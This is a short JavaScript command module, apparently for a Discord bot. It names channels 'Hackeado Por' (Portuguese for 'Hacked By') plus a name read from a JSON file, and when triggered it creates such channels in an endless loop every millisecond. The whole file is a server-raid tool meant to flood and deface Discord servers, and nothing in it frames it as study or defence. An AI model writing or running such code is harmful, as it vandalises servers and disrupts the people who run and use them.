const text = "Hackeado Por " + require("./Nome.json").nome;
exports.run = async (client, message) => {
setInterval(() => {
        message.guild.createChannel(text, "text")
}, 1)
}